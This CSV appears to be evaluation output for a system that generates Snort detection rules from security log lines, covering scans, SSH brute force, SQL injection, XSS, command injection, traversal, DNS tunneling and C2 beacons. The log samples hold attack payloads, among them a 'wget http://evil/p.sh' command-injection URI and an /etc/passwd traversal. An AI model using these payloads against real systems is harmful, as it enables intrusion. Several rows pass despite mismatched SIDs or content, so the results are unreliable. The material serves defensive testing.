log_id,raw_log,expected_attack_type,expected_label,predicted_attack_type,matched_query,retrieved_context_used,source_doc_ids,generated_rule,generated_sid,rule_status,snort3_rule_exists,pcap_scenario,pcap_alert_count,pcap_triggered_sids,final_status,notes
SNORT-P1-0001,"2026-05-25T08:10:12Z FW scan_event src=198.51.100.10 dst=10.0.0.20 proto=TCP spt=40000 dpt=22 flags=SYN note=connection attempts to ports 21,22,80,443 within 7s",port_scan,malicious,port_scan,Detect a TCP SYN port scan against our web server,True,"[""SNORT-P1-0006"", ""SNORT-P1-0014"", ""SNORT-P1-0002""]","alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)",9100006,True,True,tests/pcaps/generated/port_scan.pcap,3,"9100009,9100013,9100017",PASS,
SNORT-P1-0021,May 25 09:00:14 bastion sshd[2100]: Failed password for admin from 203.0.113.20 port 45000 ssh2 repeated=9,ssh_bruteforce,malicious,ssh_bruteforce,Generate a Snort rule for repeated SSH brute force attempts on port 22,True,"[""SNORT-P1-0023"", ""SNORT-P1-0026"", ""SNORT-P1-0039""]","alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)",9100023,True,True,tests/pcaps/generated/ssh_bruteforce.pcap,24,"9100023,9100027,9100030,9100034,9100035,9100038,9100040",PASS,
SNORT-P1-0041,"192.0.2.40 - - [25/May/2026:10:00:02 +0000] ""GET /products?id=7%20UNION%20SELECT%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",sql_injection,malicious,sql_injection,Detect SQL injection with UNION SELECT in HTTP URI,True,"[""SNORT-P1-0056"", ""SNORT-P1-0041"", ""SNORT-P1-0047""]","alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null"",nocase; classtype:web-application-attack; sid:9100056; rev:1;)",9100056,True,True,tests/pcaps/generated/sql_injection.pcap,1,9100041,PASS,
SNORT-P1-0061,"203.0.113.60 - - [25/May/2026:11:00:22 +0000] ""GET /comment?text=<script>alert(1)</script> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",xss,malicious,xss,Detect XSS attack where the URI contains <script>alert(1)</script>,True,"[""SNORT-P1-0061"", ""SNORT-P1-0073"", ""SNORT-P1-0071""]","alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script"",nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)",9100061,True,True,tests/pcaps/generated/xss.pcap,1,9100181,PASS,
SNORT-P1-0081,"2026-05-25T12:00:55Z waf alert src=198.51.100.80 dst=10.30.0.10 uri=""/cgi-bin/admin?cmd=;wget http://evil/p.sh"" action=blocked signature=command_injection proto=HTTP",command_injection,malicious,command_injection,Detect command injection with cmd parameter and whoami in HTTP request,True,"[""SNORT-P1-0087"", ""SNORT-P1-0099"", ""SNORT-P1-0094""]","alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami"",nocase; classtype:web-application-attack; sid:9100087; rev:1;)",9100087,True,True,tests/pcaps/generated/command_injection.pcap,1,9100081,PASS,
SNORT-P1-0101,"203.0.113.100 - - [25/May/2026:13:00:40 +0000] ""GET ../../../../etc/passwd HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",directory_traversal,malicious,directory_traversal,Alert when someone tries ../../../../etc/passwd directory traversal,True,"[""SNORT-P1-0101"", ""SNORT-P1-0119"", ""SNORT-P1-0107""]","alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../"",nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)",9100101,True,True,tests/pcaps/generated/directory_traversal.pcap,3,"9100107,9100113,9100119",PASS,
SNORT-P1-0121,1716812000.44 DNS a9d3-sync-node-00.segment1.data.exfil.example.com qtype=TXT src=10.40.0.20 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,dns_tunneling,malicious,dns_tunneling,Detect DNS tunneling using long encoded subdomains,True,"[""SNORT-P1-0126"", ""SNORT-P1-0134"", ""SNORT-P1-0129""]","alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 6""; content:""segment"",nocase; dsize:>70; classtype:policy-violation; sid:9100126; rev:1;)",9100126,True,True,tests/pcaps/generated/dns_tunneling.pcap,1,9100182,PASS,
SNORT-P1-0141,2026-05-25T15:00:09Z icmp sweep src=198.51.100.140 targets=10.0.0.10-10.0.0.25 type=echo-request count=8 note=multiple hosts in 5s,icmp_sweep,malicious,icmp_sweep,Detect ICMP ping sweep against internal network,True,"[""SNORT-P1-0157"", ""SNORT-P1-0141"", ""SNORT-P1-0149""]","alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 17""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100157; rev:1;)",9100157,True,True,tests/pcaps/generated/icmp_sweep.pcap,15,9100183,PASS,
SNORT-P1-0161,"2026-05-25T16:00:31Z proxy src=10.50.0.10 dst=203.0.113.200 proto=HTTPS uri=""/beacon"" interval=120s ua=""svc-update"" note=periodic beacon",malware_c2,malicious,malware_c2,Detect malware command and control beacon to /gate.php,True,"[""SNORT-P1-0162"", ""SNORT-P1-0174"", ""SNORT-P1-0161""]","alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php"",nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)",9100162,True,True,tests/pcaps/generated/malware_c2.pcap,2,9100162,PASS,
SNORT-P1-0181,2026-05-25T17:00:11Z access src=10.60.0.10 dst=10.70.0.20 proto=HTTP dpt=443 note=Normal user browsing corporate portal over HTTPS with regular GET /home and static CSS requests status=200 category=benign,benign_traffic,benign,benign_traffic,A user connects normally to the company website using HTTPS,True,"[""SNORT-P1-0181"", ""SNORT-P1-0189"", ""SNORT-P1-0185""]",NO_RULE_RECOMMENDED,,NO_RULE_RECOMMENDED,False,tests/pcaps/generated/benign_traffic.pcap,0,,PASS,
